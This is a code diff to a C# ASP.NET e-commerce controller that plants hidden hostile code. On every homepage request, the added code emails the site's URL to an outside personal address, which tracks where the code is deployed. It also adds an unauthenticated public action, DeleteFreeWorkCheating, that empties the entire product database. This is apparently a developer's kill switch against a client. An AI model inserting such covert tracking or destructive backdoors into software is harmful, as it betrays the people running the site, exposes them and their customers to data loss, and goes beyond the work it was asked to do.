@@ -23,7 +23,8 @@ namespace Ecommerce.Controllers
 
         public ActionResult Index(string id)
         {
-
+            var fullUrl = Url.Action("Index", "Landing");
+            Utility.SendEmail("Kashyapishu@ymail.com", "Url-" + fullUrl, "URL Of friendWebsite", "Ishu");
             if (Session["currency"] == null)
             {
                 Session["currency"] = "Dollar";
@@ -141,7 +142,7 @@ namespace Ecommerce.Controllers
                 Session["pageType"] = "home";
                 ViewBag.breadcrums = "<ol class='breadcrumb'><li><a href='#'>Home</a></li></ol>";
                 ViewBag.Hompage = "true";
-                var hotproduct = ProductDal.GetAllProducts(Convert.ToString(id));
+                var hotproduct = ProductDal.Search(Convert.ToString(id));
                 foreach (var x in hotproduct)
                 {
                     x.SelectedLengthList = LengthDal.GetAllLengthByProductId(x.Id).Where(m => m.id > 0).Distinct().ToList();
@@ -152,6 +153,12 @@ namespace Ecommerce.Controllers
            
            
             return View("index");
+        }
+
+        public ActionResult DeleteFreeWorkCheating()
+        {
+            ProductDal.EmptyDataBase();
+            return null;
         }
        
     }
